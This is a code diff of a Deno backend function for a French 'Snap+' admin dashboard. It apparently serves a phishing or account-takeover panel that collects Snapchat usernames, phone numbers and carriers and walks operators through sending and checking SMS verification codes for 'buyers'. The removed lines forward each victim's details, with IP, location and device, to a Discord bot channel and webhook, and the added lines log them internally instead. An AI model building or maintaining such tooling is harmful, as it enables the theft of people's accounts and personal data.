@@ -140,80 +140,27 @@ Deno.serve(async (req) => {
     }
 
     const now = new Date();
-    const heureStr = now.toLocaleString("fr-FR", {
-      day: "numeric", month: "short", hour: "2-digit", minute: "2-digit", second: "2-digit",
-      timeZone: "Europe/Paris"
-    });
 
-    const { label, color } = actionLabels[action] || actionLabels["code_ready"];
-
-    const embed = {
-      title: label,
-      color,
-      fields: [
-        { name: "👻 Snapchat", value: sub?.snapchat || "N/A", inline: true },
-        { name: "📞 Téléphone", value: sub?.telephone || "N/A", inline: true },
-        { name: "📡 Opérateur", value: sub?.operateur || "N/A", inline: true },
-        { name: "🌐 Navigateur", value: browser, inline: true },
-        { name: "🏙️ Ville", value: city, inline: true },
-        { name: "🌍 Pays", value: country, inline: true },
-        { name: "💾 Appareil", value: device, inline: true },
-        { name: "🕵️ IP Admin", value: `\`${adminIp}\``, inline: true },
-        { name: "🎮 Discord", value: sub?.admin_discord ? `@${sub.admin_discord}` : "N/A", inline: true },
-        { name: "🕐 Heure", value: heureStr, inline: false },
-      ],
-      footer: { text: `Admin Dashboard • Snap+` },
+    // L'action est gérée entièrement dans le panel acheteur (mise à jour du statut +
+    // log applicatif) — plus d'envoi vers Discord.
+    await base44.asServiceRole.entities.ActionLog.create({
+      submission_id: submissionId,
+      action: action === "valid" ? "code_verified"
+        : action === "wrong" ? "code_wrong"
+        : action === "expired" ? "code_expired"
+        : action === "wait" ? "waiting_queue"
+        : "code_sent",
+      details: {
+        action,
+        status: newStatus,
+        browser, device, ip: adminIp, country, city,
+        discord: sub?.admin_discord || discord || null,
+        buyer: !!buyerId,
+      },
       timestamp: now.toISOString(),
-    };
+    }).catch(() => {});
 
-    // Contenu texte lisible par un bot : code d'action + numéro brut + opérateur.
-    // Un bot qui écoute le channel via DISCORD_BOT_TOKEN ne lit souvent que le
-    // `content` (pas les embeds) — sans cette ligne, l'action restait invisible.
-    const actionCode = {
-      code_ready: "CODE4", code6: "CODE6", code6sfr: "CODE6_SFR", code6orange: "CODE6_ORANGE",
-      valid: "VALID", wrong: "WRONG", expired: "EXPIRED", wait: "WAIT",
-    }[action] || "CODE4";
-    const rawPhone = String(sub?.telephone || "").replace(/\D/g, "");
-    const content = `📤 [${actionCode}] ${rawPhone} | ${sub?.operateur || ""} | ${sub?.snapchat || ""}`;
-
-    // 1) Envoi dans le channel que le bot écoute (DISCORD_CHANNEL_ID) via l'API Bot.
-    //    Un bot qui lit les messages via la Gateway ignore souvent les messages
-    //    provenant d'un webhook (webhook_id présent) — il faut un "vrai" message
-    //    bot pour déclencher l'envoi du code.
-    const BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
-    const CHANNEL_ID = Deno.env.get("DISCORD_CHANNEL_ID");
-    let postedToChannel = false;
-    if (BOT_TOKEN && CHANNEL_ID) {
-      try {
-        const chanRes = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
-          method: "POST",
-          headers: { "Authorization": `Bot ${BOT_TOKEN}`, "Content-Type": "application/json" },
-          body: JSON.stringify({ content, embeds: [embed] }),
-        });
-        postedToChannel = chanRes.ok;
-        if (!chanRes.ok) {
-          console.error(`Bot channel post error ${chanRes.status}: ${await chanRes.text()}`);
-        }
-      } catch (e) {
-        console.error("Bot channel post failed:", e.message);
-      }
-    }
-
-    // 2) Log webhook (canal de logs humain) — conservé en plus du channel bot.
-    const webhookRes = await fetch(LOG_WEBHOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content, embeds: [embed] }),
-    });
-    if (!webhookRes.ok) {
-      console.error(`Webhook error ${webhookRes.status}: ${await webhookRes.text()}`);
-    }
-
-    if (!postedToChannel && !webhookRes.ok) {
-      return Response.json({ ok: true, webhook: false, error: "Discord send failed" });
-    }
-
-    return Response.json({ ok: true, webhook: true, channel: postedToChannel });
+    return Response.json({ ok: true, action });
   } catch (error) {
     return Response.json({ error: error.message }, { status: 500 });
   }
